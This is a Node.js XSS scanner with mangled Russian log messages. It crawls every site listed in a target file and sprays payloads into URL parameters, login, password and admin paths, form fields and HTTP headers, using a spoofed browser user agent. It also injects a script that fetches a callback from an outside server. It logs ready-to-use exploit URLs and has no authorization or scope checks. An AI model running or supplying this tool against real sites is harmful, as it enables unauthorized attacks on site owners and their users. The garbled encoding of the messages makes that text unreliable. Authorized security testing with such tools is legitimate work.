const fs = require('fs');
const path = require('path');
const axios = require('axios');
const cheerio = require('cheerio');
const { URL } = require('url');
const { default: pLimit } = require('p-limit');
const retry = require('async-retry');

const CONFIG = {
    payloadsFile: 'payloads.txt',
    targetsFile: 'url.txt',
    logDir: 'log',
    commonPaths: ['/', '/search', '/index.php', '/catalog', '/blog', '/products', '/news', '/admin', '/login', '/register'],
    commonParams: ['q', 's', 'search', 'query', 'term', 'id', 'item', 'page', 'input', 'keywords', 'txt', 'user', 'password'],
    concurrencyLimitPerSite: 5,
    timeout: 30000,
    maxCrawlDepth: 3,
    verificationServer: null,
    customHeaders: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    },
    retryAttempts: 3,
    retryFactor: 2,
    retryMinTimeout: 1000,
    retryMaxTimeout: 5000
};

const payloads = fs.readFileSync(CONFIG.payloadsFile, 'utf-8').split('\n').filter(Boolean);
const targets = fs.readFileSync(CONFIG.targetsFile, 'utf-8').split('\n').filter(Boolean);

if (!fs.existsSync(CONFIG.logDir)) {
    fs.mkdirSync(CONFIG.logDir, { recursive: true });
}

function getRunLogDir() {
    let counter = 1;
    const runLogDirBase = path.join(CONFIG.logDir);
    while (fs.existsSync(path.join(runLogDirBase, `log ${counter}`))) {
        counter++;
    }
    return path.join(runLogDirBase, `log ${counter}`);
}

const currentRunLogDir = getRunLogDir();
if (!fs.existsSync(currentRunLogDir)) {
    fs.mkdirSync(currentRunLogDir, { recursive: true });
}

function getSiteLogDir(baseUrl) {
    const hostname = new URL(baseUrl).hostname.replace(/[^a-zA-Z0-9.]/g, '_');
    return path.join(currentRunLogDir, hostname);
}

function getLogFileName() {
    return `log_${Date.now()}.txt`;
}

const allFindings = {};
let findingsCount = 0;

function logToFile(logPath, message) {
    fs.appendFileSync(logPath, `${message}\n`);
}

async function verifyXss(url, param, method = 'GET', postData = null, timeout = CONFIG.timeout) {
    if (!CONFIG.verificationServer) {
        return true;
    }

    const uniqueId = Date.now();
    const verificationPayload = `<script>fetch('${CONFIG.verificationServer}/xss_probe_${uniqueId}')</script>`;
    
    let testUrl = url;
    let requestOptions = {
        method: method,
        timeout: timeout,
        headers: CONFIG.customHeaders,
    };

    if (method === 'GET') {
        testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(verificationPayload)}`;
        requestOptions.url = testUrl;
    } else if (method === 'POST') {
        requestOptions.url = url;
        requestOptions.headers = { ...CONFIG.customHeaders, 'Content-Type': 'application/x-www-form-urlencoded' };
        requestOptions.data = postData ? `${postData}&${param}=${encodeURIComponent(verificationPayload)}` : `${param}=${encodeURIComponent(verificationPayload)}`;
    }

    try {
        await axios(requestOptions);
        console.log(`üî¨ –ü—Ä–æ–≤–µ—Ä–∫–∞ XSS –Ω–∞ ${url} (${method}) —Å ID: ${uniqueId}. –û–∂–∏–¥–∞–µ–º –∫–æ–ª–ª–±—ç–∫ –Ω–∞ ${CONFIG.verificationServer}...`);
        
        return true; 
    } catch (error) {
        console.error(`–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ø—Ä–æ–±–Ω–∏–∫–∞ –¥–ª—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ XSS: ${error.message}`);
        return false;
    }
}

async function logFinding(baseUrl, siteLogDir, data) {
    const logPath = path.join(siteLogDir, getLogFileName());
    const timestamp = new Date().toISOString();
    const fullUrlWithPayload = data.method === 'GET'
        ? `${data.url}${data.url.includes('?') ? '&' : '?'}${data.param}=${encodeURIComponent(data.payload)}`
        : `${data.url} (POST data: ${data.postData || 'N/A'}, Param: ${data.param} with Payload)`;

    const logMessage = `
===============================================================================
[${timestamp}] –ù–∞–π–¥–µ–Ω–∞ XSS —É—è–∑–≤–∏–º–æ—Å—Ç—å
===============================================================================
–°–∞–π—Ç:     ${baseUrl}
–¢–∏–ø:      ${data.type}
URL:      ${data.url}
–ü–∞—Ä–∞–º–µ—Ç—Ä: ${data.param || 'N/A'}
Payload:  ${data.payload}
–ú–µ—Ç–æ–¥:    ${data.method}
-------------------------------------------------------------------------------
–ü–û–õ–ù–´–ô URL + PAYLOAD –î–õ–Ø –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–Ø: ${fullUrlWithPayload}
-------------------------------------------------------------------------------
`;
    if (!allFindings[baseUrl]) {
        allFindings[baseUrl] = [];
    }
    allFindings[baseUrl].push({ ...data, timestamp });
    findingsCount++;
    console.log(`[+] –ù–∞–π–¥–µ–Ω–æ XSS: ${findingsCount} (${data.url})`);
    logToFile(logPath, logMessage);
}

async function crawlLinks(baseUrl, depth, visitedUrls, queue, timeout) {
    if (depth > CONFIG.maxCrawlDepth || visitedUrls.has(baseUrl)) return;
    visitedUrls.add(baseUrl);
    queue.add(baseUrl);

    try {
        const res = await axios.get(baseUrl, { timeout: timeout, headers: CONFIG.customHeaders });
        const $ = cheerio.load(res.data);
        const baseHost = new URL(baseUrl).host;

        $('a[href]').each((_, a) => {
            let href = $(a).attr('href');
            if (!href) return;

            try {
                const url = new URL(href, baseUrl);
                if (url.host === baseHost && !visitedUrls.has(url.href.split('#')[0])) {
                    queue.add(url.href.split('#')[0]);
                }
            } catch (e) { }
        });
    } catch (error) {
        const siteLogDir = getSiteLogDir(baseUrl);
        const logPath = path.join(siteLogDir, getLogFileName());
        const timestamp = new Date().toISOString();
        const errorMessage = `[${timestamp}] ‚ö†Ô∏è [${baseUrl}] –û—à–∏–±–∫–∞ –ø—Ä–∏ –∫—Ä–∞—É–ª–∏–Ω–≥–µ ${baseUrl}: ${error.message}\n`;
        console.error(errorMessage);
        logToFile(logPath, errorMessage);
    } finally {
        queue.delete(baseUrl);
    }
}

async function fetchForms(url, timeout) {
    try {
        const res = await axios.get(url, { timeout: timeout, headers: CONFIG.customHeaders });
        const $ = cheerio.load(res.data);
        const forms = [];

        $('form').each((_, form) => {
            const action = $(form).attr('action') || url;
            const method = ($(form).attr('method') || 'get').toLowerCase();
            const inputs = [];

            $(form).find('input[name],textarea[name],select[name]').each((_, i) => {
                const name = $(i).attr('name');
                if (name) inputs.push(name);
            });

            forms.push({ action, method, inputs });
        });

        return forms;
    } catch (error) {
        const siteLogDir = getSiteLogDir(url);
        const logPath = path.join(siteLogDir, getLogFileName());
        const timestamp = new Date().toISOString();
        const errorMessage = `[${timestamp}] ‚ö†Ô∏è [${new URL(url).hostname}] –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Ñ–æ—Ä–º —Å ${url}: ${error.message}\n`;
        console.error(errorMessage);
        logToFile(logPath, errorMessage);
        return [];
    }
}

async function testUrlParam(baseUrl, siteLogDir, url, param, payload, method = 'GET', timeout) {
    let targetUrl = url;
    let postData = null;

    if (method === 'GET') {
        targetUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`;
    } else if (method === 'POST') {
        postData = `${param}=${encodeURIComponent(payload)}`;
    }

    try {
        const options = {
            method: method,
            url: targetUrl,
            timeout: timeout,
            headers: { ...CONFIG.customHeaders, 'Content-Type': 'application/x-www-form-urlencoded' }
        };
        if (postData) {
            options.data = postData;
        }

        const res = await axios(options);
        if (res.data && res.data.includes(payload)) {
            console.log(`[!] –ü–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–∞—è XSS –Ω–∞–π–¥–µ–Ω–∞ (–æ—Ç—Ä–∞–∂–µ–Ω–∏–µ) –Ω–∞ ${url} —á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä ${param} —Å –ø–µ–π–ª–æ–∞–¥–æ–º ${payload}.`);
            if (await verifyXss(url, param, method, postData)) {
                logFinding(baseUrl, siteLogDir, { type: 'url_param', url: targetUrl, payload, method, vulnerable: true, param });
                return true;
            }
        }
    } catch (error) {
    }
    return false;
}

async function testHeaders(baseUrl, siteLogDir, url, payload, timeout) {
    const headersToTest = {
        'User-Agent': payload,
        'Referer': payload,
        'Cookie': `session=${encodeURIComponent(payload)}`,
        'X-Forwarded-For': payload
    };

    for (const [key, val] of Object.entries(headersToTest)) {
        try {
            const res = await axios.get(url, { headers: { ...CONFIG.customHeaders, [key]: val }, timeout: timeout });
            if (res.data && res.data.includes(payload)) {
                   console.log(`[!] –ü–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–∞—è XSS –Ω–∞–π–¥–µ–Ω–∞ (–æ—Ç—Ä–∞–∂–µ–Ω–∏–µ) –Ω–∞ ${url} —á–µ—Ä–µ–∑ –∑–∞–≥–æ–ª–æ–≤–æ–∫ ${key} —Å –ø–µ–π–ª–æ–∞–¥–æ–º ${payload}.`);
                if (await verifyXss(url, key, 'GET', null)) {
                    logFinding(baseUrl, siteLogDir, { type: `header_${key}`, url, payload, method: 'GET', vulnerable: true, param: key });
                }
            }
        } catch (error) {
        }
    }
}

async function testForm(baseUrl, siteLogDir, form, payload, currentUrl, timeout) {
    try {
        const targetUrl = form.action.startsWith('http')
            ? form.action
            : new URL(form.action, currentUrl).href;

        const data = {};
        let vulnerableParam = null;
        let res;
        let postDataString = null;

        if (form.method === 'post') {
            for (const inputName of form.inputs) {
                data[inputName] = payload;
            }
            postDataString = new URLSearchParams(data).toString();
            res = await axios.post(targetUrl, postDataString, {
                headers: { ...CONFIG.customHeaders, 'Content-Type': 'application/x-www-form-urlencoded' },
                timeout: timeout
            });
            if (res.data && res.data.includes(payload)) {
                console.log(`[!] –ü–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–∞—è XSS –Ω–∞–π–¥–µ–Ω–∞ (–æ—Ç—Ä–∞–∂–µ–Ω–∏–µ) –Ω–∞ —Ñ–æ—Ä–º–µ ${targetUrl} (POST) —á–µ—Ä–µ–∑ –ø–æ–ª—è ${form.inputs.join(',')} —Å –ø–µ–π–ª–æ–∞–¥–æ–º ${payload}.`);
                vulnerableParam = form.inputs.join(',');
                if (await verifyXss(targetUrl, vulnerableParam, 'POST', postDataString)) {
                    logFinding(baseUrl, siteLogDir, { type: 'post_form', url: targetUrl, payload, method: 'POST', vulnerable: true, param: vulnerableParam, postData: postDataString });
                }
            }
        } else {
            for (const inputName of form.inputs) {
                data[inputName] = payload;
            }
            const qs = Object.entries(data)
                .map(([k, v]) => `${k}=${encodeURIComponent(v)}`)
                .join('&');
            res = await axios.get(`${targetUrl}?${qs}`, { headers: CONFIG.customHeaders, timeout: timeout });
            if (res.data && res.data.includes(payload)) {
                console.log(`[!] –ü–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–∞—è XSS –Ω–∞–π–¥–µ–Ω–∞ (–æ—Ç—Ä–∞–∂–µ–Ω–∏–µ) –Ω–∞ —Ñ–æ—Ä–º–µ ${targetUrl} (GET) —á–µ—Ä–µ–∑ –ø–æ–ª—è ${form.inputs.join(',')} —Å –ø–µ–π–ª–æ–∞–¥–æ–º ${payload}.`);
                const parsedUrl = new URL(`${targetUrl}?${qs}`);
                vulnerableParam = parsedUrl.searchParams.keys().find(key => form.inputs.includes(key));
                if (await verifyXss(`${targetUrl}?${qs}`, vulnerableParam, 'GET')) {
                    logFinding(baseUrl, siteLogDir, { type: 'get_form', url: `${targetUrl}?${qs}`, payload, method: 'GET', vulnerable: true, param: vulnerableParam });
                }
            }
        }
    } catch (error) {
        const siteLogDir = getSiteLogDir(currentUrl);
        const logPath = path.join(siteLogDir, getLogFileName());
        const timestamp = new Date().toISOString();
        const errorMessage = `[${timestamp}] ‚ö†Ô∏è [${new URL(currentUrl).hostname}] –û—à–∏–±–∫–∞ –ø—Ä–∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ —Ñ–æ—Ä–º—ã: ${error.message}\n`;
        console.error(errorMessage);
        logToFile(logPath, errorMessage);
    }
    return false;
}

async function scanUrl(baseUrl, siteLogDir, url, timeout, limitFn) {
    for (const pathPart of CONFIG.commonPaths) {
        for (const param of CONFIG.commonParams) {
            for (const payload of payloads) {
                limitFn(() => testUrlParam(baseUrl, siteLogDir, url, param, payload, 'GET', timeout));
                limitFn(() => testUrlParam(baseUrl, siteLogDir, url + pathPart, param, payload, 'POST', timeout));
            }
        }
    }

    for (const payload of payloads) {
        limitFn(() => testHeaders(baseUrl, siteLogDir, url, payload, timeout));
    }

    const forms = await fetchForms(url, timeout);
    for (const form of forms) {
        for (const payload of payloads) {
            limitFn(() => testForm(baseUrl, siteLogDir, form, payload, url, timeout));
        }
    }
}

async function scanSite(base) {
    const siteLogDir = getSiteLogDir(base);
    if (!fs.existsSync(siteLogDir)) {
        fs.mkdirSync(siteLogDir, { recursive: true });
    }
    const limitFn = pLimit(CONFIG.concurrencyLimitPerSite);
    const visitedUrls = new Set();
    const queue = new Set();
    queue.add(base);

    console.log(`\nüîé –ù–∞—á–∏–Ω–∞—é —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∞–π—Ç–∞: ${base} (–õ–æ–≥–∏ –≤: ${siteLogDir})`);
    const logPathStart = path.join(siteLogDir, getLogFileName());
    const timestampStart = new Date().toISOString();
    logToFile(logPathStart, `[${timestampStart}] üîé –ù–∞—á–∏–Ω–∞—é —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∞–π—Ç–∞: ${base}\n`);

    while (queue.size > 0) {
        const currentUrl = Array.from(queue)[0];
        queue.delete(currentUrl);

        await retry(
            async () => {
                await crawlLinks(currentUrl, Array.from(visitedUrls).filter(url => url.startsWith(base)).length, visitedUrls, queue, CONFIG.timeout);
            },
            {
                retries: CONFIG.retryAttempts,
                factor: CONFIG.retryFactor,
                minTimeout: CONFIG.retryMinTimeout,
                maxTimeout: CONFIG.retryMaxTimeout
            }
        );

        await retry(
            async () => {
                await scanUrl(base, siteLogDir, currentUrl, CONFIG.timeout, limitFn);
            },
            {
                retries: CONFIG.retryAttempts,
                factor: CONFIG.retryFactor,
                minTimeout: CONFIG.retryMinTimeout,
                maxTimeout: CONFIG.retryMaxTimeout
            }
        );
    }

    console.log(`‚úÖ –ó–∞–≤–µ—Ä—à–µ–Ω–æ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∞–π—Ç–∞: ${base}`);
    const logPathEnd = path.join(siteLogDir, getLogFileName());
    const timestampEnd = new Date().toISOString();
    logToFile(logPathEnd, `\n[${timestampEnd}] ‚úÖ –ó–∞–≤–µ—Ä—à–µ–Ω–æ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∞–π—Ç–∞: ${base}\n`);
}

(async () => {
    try {
        console.log('üöÄ –ó–∞–ø—É—Å–∫ —Å–∫–∞–Ω–µ—Ä–∞ XSS —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π');
        console.log(`üîß –ù–∞—Å—Ç—Ä–æ–µ–Ω–æ ${payloads.length} payloads –∏ ${targets.length} —Ü–µ–ª–µ–π`);
        console.log(`‚öôÔ∏è –ü–∞—Ä–∞–ª–ª–µ–ª—å–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ —Å–∞–π—Ç: ${CONFIG.concurrencyLimitPerSite}, –¢–∞–π–º–∞—É—Ç: ${CONFIG.timeout}ms, –ì–ª—É–±–∏–Ω–∞ –∫—Ä–∞—É–ª–∏–Ω–≥–∞: ${CONFIG.maxCrawlDepth}`);
        if (CONFIG.verificationServer) {
            console.log(`üîó –°–µ—Ä–≤–µ—Ä –¥–ª—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏: ${CONFIG.verificationServer} (–ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è XSS!)`);
        } else {
            console.log(`‚ö†Ô∏è –°–µ—Ä–≤–µ—Ä –¥–ª—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ XSS –Ω–µ —É–∫–∞–∑–∞–Ω. –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –±—É–¥–µ—Ç –æ—Å–Ω–æ–≤—ã–≤–∞—Ç—å—Å—è —Ç–æ–ª—å–∫–æ –Ω–∞ –æ—Ç—Ä–∞–∂–µ–Ω–∏–∏ –ø–µ–π–ª–æ–∞–¥–∞, —á—Ç–æ –º–æ–∂–µ—Ç –¥–∞–≤–∞—Ç—å –ª–æ–∂–Ω—ã–µ —Å—Ä–∞–±–∞—Ç—ã–≤–∞–Ω–∏—è.`);
            console.log(`    –î–ª—è –±–æ–ª–µ–µ —Ç–æ—á–Ω–æ–π –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ —É–∫–∞–∂–∏—Ç–µ 'verificationServer' –≤ CONFIG.`);
        }
        console.log(`üìÅ –õ–æ–≥–∏ –±—É–¥—É—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤ –ø–∞–ø–∫–∞—Ö –≤–∏–¥–∞ 'log N' -> '–¥–æ–º–µ–Ω —Å–∞–π—Ç–∞' -> 'log_timestamp.txt' –≤: ${CONFIG.logDir}\n`);

        const scanPromises = targets.map(site => scanSite(site));
        await Promise.all(scanPromises);

        console.log(`\nüéâ –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ!`);
        console.log(`üìä –í—Å–µ–≥–æ –Ω–∞–π–¥–µ–Ω–æ ${findingsCount} XSS —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π.`);
        console.log(`üìÅ –†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤: ${CONFIG.logDir}`);
    } catch (error) {
        console.error(`üí• –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: ${error.message}`);
    }
})();